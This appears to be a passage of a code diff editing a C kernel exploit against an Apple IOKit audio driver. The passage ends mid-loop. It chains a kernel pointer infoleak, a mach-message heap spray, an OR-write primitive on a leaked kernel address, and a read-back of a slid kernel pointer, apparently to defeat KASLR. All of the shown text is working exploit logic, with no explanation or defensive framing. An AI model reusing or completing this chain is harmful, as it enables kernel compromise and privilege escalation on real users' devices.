@@ -25,51 +25,53 @@ int main(void)
 
   pwn_init();
 
-  kern_obj_t kernel_objects[16];
+  char* vz = calloc(1500,1);
+
+  kern_obj_t kernel_objects[2];
   io_connect_t connections[16];
   mach_port_t ports[256];
 
-  char *ool_data = calloc(1500, 1);
+  int active=0;
 
-int active=0;
-
-while(1) {
-  for (uint32_t k = 0; k != MAX_ALLOCS; k++) {
-    if (connections[k]) {
-      IOServiceClose(connections[k]);
-      connections[k]=0;
-    }
-  }
-
-  if (((kernel_objects[0].kptr = io_audio_engine_infoleak(&(kernel_objects[0].kconn))) & 0xfff) != 0xc00) {
-    while ((kernel_objects[1].kptr = io_audio_engine_infoleak(&(kernel_objects[1].kconn)))) {
-      if (kernel_objects[1].kptr == kernel_objects[0].kptr+1024) {
-        goto done;
+  while(1) {
+    for (uint32_t k = 0; k != 10; k++) {
+      if (connections[k]) {
+        IOServiceClose(connections[k]);
+        connections[k]=0;
       }
-
-      if (active==10) {
-        break;
-      }
-
-      connections[active]=kernel_objects[1].kconn;
-      kernel_objects[1].kconn=0;
-      active++;
-
     }
-  }
 
-}
+    if (((kernel_objects[0].kptr = io_audio_engine_infoleak(&(kernel_objects[0].kconn))) & 0xfff) != 0xc00) {
+      while ((kernel_objects[1].kptr = io_audio_engine_infoleak(&(kernel_objects[1].kconn)))) {
+        if (kernel_objects[1].kptr == kernel_objects[0].kptr+1024) {
+          goto done;
+        }
+
+        if (active==10) {
+          break;
+        }
+
+        connections[active]=kernel_objects[1].kconn;
+        kernel_objects[1].kconn=0;
+        active++;
+
+      }
+    }
+
+  }
 
   done:;
+  //printf("done! 0: %#llx -- 1: %#llx\n", kernel_objects[0].kptr, kernel_objects[1].kptr);
+
   IOServiceClose(kernel_objects[0].kconn);
 
-  for (uint32_t i = 0; i < 100; i++) {
-    hp_msg_send_kernel(ool_data, 1024-88, &ports[i]);
+  for (uint32_t i = 0; i < 256; i++) {
+    hp_msg_send_kernel(vz, 1024-88, &ports[i]);
   }
 
   or_primitive(kernel_objects[0].kptr + 16);
 
-  for (uint32_t i = 0; i < 100; i++) {
+  for (uint32_t i = 0; i < 256; i++) {
     char *kek = (char*)hp_msg_recv_kernel(ports[i]);
     uint64_t slid=*(uint64_t*)(kek+(1024-88));
     if (slid) {
